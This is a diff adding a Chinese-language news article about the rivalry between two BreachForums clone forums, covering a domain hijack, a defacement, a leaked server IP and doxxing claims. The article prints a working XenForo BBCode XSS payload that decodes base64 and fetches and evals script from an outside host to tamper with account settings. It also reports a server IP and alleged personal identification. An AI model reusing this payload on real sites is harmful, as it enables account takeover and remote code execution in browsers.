@@ -1,0 +1,107 @@
++++
+title = "真假美猴王：两个重启启动的新BreachForums暗网论坛的战争正在打响"
+date = 2026-02-09T23:54:00+08:00
+categories = ["暗网网站", "独家报道"]
+tags = ["BreachForums", "HasanBroker", "暗网论坛"]
+thumbnail = ""
++++
+
+<div class="entry-content clearfix">
+                            <div class="wp-block-image">
+<figure class="aligncenter size-large"><noscript><img fetchpriority="high" decoding="async" width="1024" height="833" src="/images/56bb608c10de02365964a8e7c0fda2be.webp" alt="真假美猴王：两个重启启动的新BreachForums暗网论坛的战争正在打响" class="wp-image-4676"></noscript><img fetchpriority="high" decoding="async" width="1024" height="833" src="/images/56bb608c10de02365964a8e7c0fda2be.webp" alt="真假美猴王：两个重启启动的新BreachForums暗网论坛的战争正在打响" class="wp-image-4676 j-lazy"></figure></div>
+
+
+<p>自从多次重启后的<span class="wpcom_tag_link">BreachForums</span>论坛被FBI查封之后，暗网先后出现了两个名为BreachForums的论坛，一个是Indra的BreachForums[.]bf（管理员Indra与N/A），一个是Hasan的BreachForums[.]cz（管理员<span class="wpcom_tag_link">HasanBroker</span>与<strong>breach3d</strong>）。这两个论坛的诞生注定会硝烟四起，BreachForums克隆论坛之间的一场战役正在打响。</p>
+
+
+
+<p>“<mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-red-color">暗网下/AWX</mark>”此前跟踪报道，Indra的BreachForums[.]bf于2025年12月诞生，使用MyBB搭建，通过投放.fr域名数据库并伪造政府邮箱宣布论坛成立，宣称自己才是真正的官方BF论坛；Hasan的BreachForums[.]cz于2026年1月出现，使用XenForo搭建，称自己才是正统，目前已吸引逾1400名成员加入。</p>
+
+
+
+<p>近期，这两个BreachForums论坛的战争进入了白日化阶段，先是BreachForums[.]bf域名被社会工程学攻击后被暂停，其次BreachForums[.]cz论坛也遭受了短时间的跨站脚本（XSS）漏洞攻击，整体而言，Hasan的BreachForums[.]cz略占上风。</p>
+
+
+
+<h2 class="wp-block-heading">BreachForums[.]bf域名丢失后又被找回</h2>
+
+
+
+<p>2月3日，BreachForums[.]bf域名突然被域名注册商暂停访问，其管理员N/A发布公告，紧急启动BreachForums[.]jp域名来替代访问。同时，Hasan在BreachForums[.]cz发布主题“Takedown of the Fake Clone”（拿下仿冒克隆），并表示正在使用SQL注入、跨站脚本、SSRF请求等诸多漏洞进行攻击。</p>
+
+
+
+<p>2月8日，访问BreachForums[.]bf，显示异常的篡改消息以及倒计时，暗示该平台可能遭遇安全事件或系统入侵。界面显示了以下内容：公开倒计时、泄露的个人图像、提及涉嫌犯罪活动及执法部门的签名声明、与论坛常规运营通知无关的声明。</p>
+
+
+
+<p>根据暗网研究专家IntelOps（@IntelOpsV3）<a href="https://x.com/IntelOpsV3/status/2020900542814515341" target="_blank" rel="noreferrer noopener">发布的消息</a>，有黑客窃取某西非国家政府邮箱后，通过社会工程手段诱使域名注册商暂停了BF域名。域名注册商将技术援助请求转交布基纳法索的ABDI机构作为主管当局寻求协助，但技术援助集体成功推动其采取行动。</p>
+
+
+
+<p>据称，Hasan在该域名被删除后成功注册该域名，并在2月8日发布了篡改页面。但Indra最终说服注册商该举报属虚假信息，重新夺回BreachForums[.]bf域名控制权，并发布公告恢复该域名的使用。</p>
+
+
+
+<h2 class="wp-block-heading">BreachForums[.]cz网站被篡改后快速恢复</h2>
+
+
+
+<p>2月5日，BreachForums[.]cz网站曾遭遇了一次跨站脚本（XSS）漏洞攻击，短暂遭到篡改，疑似因为XenForo存在跨站脚本漏洞。Hasan发帖解释，该XSS漏洞可利用性源于XenForo解析BBcode的机制，属于原生漏洞即零日漏洞。</p>
+
+
+
+<p>该Payload利用JavaScript的eval函数实现Base64编码的解码功能（部分依赖混淆性安全机制）。通过atob函数解码后，得到以下在鼠标悬停时触发的JavaScript有效载荷：</p>
+
+
+
+<pre class="wp-block-code"><code>(async() =&gt; {<br>var u = "https://breachforums.pathetic.wtf/server.php?get=payload";<br>var r = await fetch(u);<br>var t = await r.text();<br>eval(t);<br>})()</code></pre>
+
+
+
+<p>Payload如下：</p>
+
+
+
+<pre class="wp-block-code"><code>'c': ['https://breachforums.pathetic.wtf/server.php', "[table width=\"100%' onmouseover='eval(atob(&amp;quot;KGFzeW5jKCk9PnsgICAgIHZhciB1ID0gImh0dHBzOi8vYnJlYWNoZm9ydW1zLnBhdGhldGljLnd0Zi9zZXJ2ZXIucGhwP2dldD1wYXlsb2FkIjsgICAgIHZhciByID0gYXdhaXQgZmV0Y2godSk7ICAgICB2YXIgdCA9IGF3YWl0IHIudGV4dCgpOyAgICAgZXZhbCh0KTsgfSkoKQ==&amp;quot;))'\"] [tr][td]click here and you will be entered into the giveaway[/td][/tr] [/table]", 0x1, "credits giveawayy", 0x0, 0x1964, 'setTimeout', 0x2, "\n&lt;head&gt;\n  &lt;meta charset=\"utf-8\"&gt;\n  &lt;title&gt;owned&lt;/title&gt;\n  &lt;style&gt;\n    body { margin: 0; padding: 0; height: 100vh; background: #000; color: #ff00aa; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; text-align: center; overflow: hidden; }\n    .container { max-width: 90%; padding: 15px; line-height: 1.3; }\Two-step verification is enabled", 'includes', 'Disable', 'ON', 'OFF', 'tf', 'POST', 'method', 'no-cors', 'mode', 'JSON', 'stringify', 'body', 'onmouseover', 'text/html', 'parseFromString', 'FormData', "textarea[name=\"signature_html\"]", 'querySelector', 'signature_html', "\n\n", 'append', '_xfToken', '_0x56bbbd$$2', 'title', 'message_html', "&lt;p&gt;Please read this important announcement regarding your account security.&lt;/p&gt;", '_0x2442b2$$2', '_0x30305c$$1', 'message', 'err']</code></pre>
+
+
+
+<h2 class="wp-block-heading">Hasan公布了BreachForums[.]jp背后的服务器IP信息</h2>
+
+
+
+<p>Hasan称追踪到BreachForums[.]jp的后端IP地址，他们把服务器托管在DDoS防护服务商那里，意味着BreachForums[.]jp的后端IP已经泄露，但无法确认是否是目前BreachForums[.]bf的后端IP。Hasan公布的IP是：186.2.165.88</p>
+
+
+
+<p>该IP位于迪拜/阿拉伯联合酋长国，因此DDoS-Guard本身也使用该主机托管服务而非自主部署。<br>他们采用IQWEB主机服务。</p>
+
+
+
+<p>Hasan还表示，BreachForums[.]bf的用户正面临来自阿联酋主机的威胁，因为阿联酋与美国及其他西方国家签订了司法互助协议。</p>
+
+
+
+<h2 class="wp-block-heading">BreachForums[.]cz一名管理员breach3d身份被人肉，但其否认</h2>
+
+
+
+<p>BreachForums[.]bf称，Hasan的BreachForums[.]cz论坛的共同所有者breach3d的真实身份被人肉出为美国佛罗里达州的Thomas。</p>
+
+
+
+<p>但breach3d对此声明予以否认。breach3d是ShinyHunters组织成员，亦自称已退出LAPSUS$组织。</p>
+
+
+
+<p>此前，breach3d进行的分析揭露了BreachForums[.]bf存在严重且系统性的安全漏洞。</p>
+
+
+
+<p>breach3d发帖称BreachForums[.]bf被发现存在关键性SSRF（服务器端请求伪造）漏洞，且其帖子创建接口完全缺乏速率限制机制。该漏洞源于对BBCode图片标签img的疏忽处理。服务器在未进行充分验证的情况下处理用户控制的外部URL，同时对帖子创建端点的POST请求几乎未设任何限制。</p>
+
+
+
+<p>breach3d表示调查过程中发现的漏洞可收集IP相关信息，这与BreachForums[.]bf反复宣称“不记录用户IP”的说法直接矛盾，且证据强烈表明第三方已试图获取并保留这些数据以备后用。</p>
+                                                                                </div>
